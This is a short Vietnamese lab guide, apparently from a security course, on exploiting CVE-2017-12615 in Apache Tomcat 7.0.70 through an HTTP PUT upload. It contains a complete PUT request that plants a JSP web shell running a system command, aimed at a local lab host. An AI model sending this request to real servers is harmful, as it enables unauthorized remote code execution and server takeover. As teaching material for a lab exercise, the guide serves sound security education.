# Kịch bản Khai thác (Exploitation Script) - Lab 2.2: The CVE Graveyard

Do bài lab này lưu trữ phiên bản phần mềm rất cũ, sinh viên có thể chuyển từ bước rà quét (Scanning) sang khai thác thực tế (Exploitation). Dưới đây là lỗ hổng điển hình và phương pháp khai thác chi tiết:

## 1. Mục tiêu: Apache Tomcat 7.0.70 (Port 8080)

### Lỗ hổng: Tomcat Remote Code Execution (CVE-2017-12615)
*(Lưu ý: Lỗ hổng này khả dụng nếu quản trị viên vô tình cấu hình tham số `readonly = false` trong `conf/web.xml`)*
* **Nguyên nhân:** Lỗi khi xử lý phương thức `PUT`. Kẻ tấn công có thể tải lên một Web Shell (đuôi `.jsp`) bằng cách thêm dấu gạch chéo `/` hoặc `%20` vào sau tên file để vượt qua cơ chế chặn file JSP.
* **Phương pháp khai thác:**
  1. Sử dụng Burp Suite hoặc cURL để gửi request:
     ```http
     PUT /shell.jsp/ HTTP/1.1
     Host: 127.0.0.1:8080
     
     <% out.println("RCE Success!"); Runtime.getRuntime().exec("id"); %>
     ```
  2. Truy cập vào `http://127.0.0.1:8080/shell.jsp` để thực thi mã độc và kiểm soát máy chủ.
